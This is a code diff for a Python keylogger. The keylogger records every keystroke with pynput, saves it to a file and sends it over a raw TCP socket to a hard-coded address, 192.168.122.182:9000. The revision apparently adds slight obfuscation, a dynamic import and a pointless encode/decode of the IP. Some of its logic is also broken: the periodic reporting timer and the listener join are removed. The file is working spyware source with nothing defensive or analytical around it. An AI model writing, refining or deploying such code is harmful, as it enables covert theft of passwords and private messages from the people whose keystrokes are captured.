@@ -1,44 +1,46 @@
-import keyboard
+import importlib
+keyboard = importlib.import_module('pynput.keyboard')
 import socket
-import os
 import threading
+
 class Keylogger:
     def __init__(self):
         self.log = ""
-    def append_to_log(self, string):
-        self.log += string
-    def process_key_press(self, key):
+
+    def on_press(self, key):
         try:
             current_key = str(key.char)
         except AttributeError:
-            if key == keyboard.Key.space:
+            if key == key.space:
                 current_key = " "
             else:
                 current_key = " " + str(key) + " "
+        self.log += current_key
         print(f"Key pressed: {current_key}")
-        self.append_to_log(current_key)
+
     def report(self):
-        with open("temp_logs.dat", "w") as f:
-            f.write(self.log)
-        print("Log file updated")
+        with open("keystrokes.dat", "w") as file:
+            file.write(self.log)
         self.send_data()
         self.log = ""
-        timer = threading.Timer(10, self.report)
-        timer.start()
+
     def send_data(self):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("192.168.1.1", 5432))
-            s.send(self.log.encode())
-            print("Data sent to server")
-            s.close()
+            ip, port = '192.168.122.182'.encode('utf-8'), 9000
+            decoded_ip = ip.decode('utf-8')
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((decoded_ip, port))
+            sock.sendall(self.log.encode())
+            sock.close()
+            print("Data sent successfully")
         except Exception as e:
             print(f"Failed to send data: {e}")
+
     def start(self):
-        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
+        keyboard_listener = keyboard.Listener(on_press=self.on_press)
         with keyboard_listener:
             self.report()
-            keyboard_listener.join()
+
 if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.start()
